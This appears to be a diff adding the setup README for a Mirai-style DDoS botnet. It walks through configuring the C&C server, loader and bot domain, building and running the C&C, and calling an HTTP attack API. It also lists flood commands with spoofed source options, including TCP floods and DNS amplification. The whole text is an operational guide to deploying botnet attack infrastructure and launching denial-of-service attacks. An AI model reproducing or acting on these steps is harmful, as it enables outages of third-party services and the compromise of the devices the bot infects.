@@ -1,0 +1,66 @@
+// change to ur server ip
+cnc/config.json
+loader/src/main.c
+loader/src/headers/config.h
+dlr/main.c // change . in ip to ,
+
+// config Ursqlpass and Uripinfo apikey in config.json
+
+// Upload All files to server
+
+// I know u are very lazy and dump
+So I make auto install for u
+cd ~/
+chmod 777 auto.sh
+source ./auto.sh
+
+// change domain
+please buy domain and connect to ur server by A record
+cd enc
+gcc enc.c -o enc
+./enc string "Urdomain"
+when u get result get encrypt text and lenght put include
+bot/table.c
+add_entry(TABLE_CNC_DOMAIN, "Urencryptdomain", lenght);
+
+//start mysql
+service mariadb restart
+mysql_secure_installation
+
+mysql -u root -pUrsqlpass // no create database mine program is auto
+
+// compile
+cd ~/
+chmod 777 *
+bash build.sh
+
+// run cnc
+cd ~/
+chmod 777 cnc
+screen ./cnc
+
+C&C Port : 12121
+
+Api : http://ip:9999/api/attack?user={User}&apikey={Key}&host={Host}&port={Port}&time={Time}&method={Method}
+// at the end U can add flag more &len=1400 etc.
+
+// How to use methods
+Tcpflood:
+ .tcpflood <target_ip> <duration> dport=<port> sport=<port> tos=<val> df=<0|1> rand=<rand> len=<size>
+ .tcpflood ip time dport=22 sport=0xffff tos=0 ttl=64 df=1 rand=1 len=0
+
+Tcpboom:
+ .tcpboom <target_ip> <duration> dport=<port> len=<size> rand=<rand> sport=<port> ttl=<val> source=<spoof>
+ .tcpboom ip time len=1024 rand=1 sport=80 dport=22 ttl=64 source=255.255.255.255
+
+Tcpkiller:
+ .Tcpkiller <target_ip> <duration> dport=<port> sport=<port> df=<0|1> ttl=<val> tos=<val> source=<spoof>
+ .tcpkiller ip time dport=22 df=1 ttl=32 tos=8 rand=1 source=255.255.255.255
+
+Mixamp:
+ .mixamp <target_ip> <duration> dport=<port> custom=<custom> tos=<val> ident=<val> ttl=<val> source=<spoof>
+ .mixamp ip time custom=dns dport=53 tos=0 ttl=255 ident=1337 source=255.255.255.255
+
+Discord:
+ .discord <target_ip> <duration> dport=<port>
+ .discord ip time dport=50001
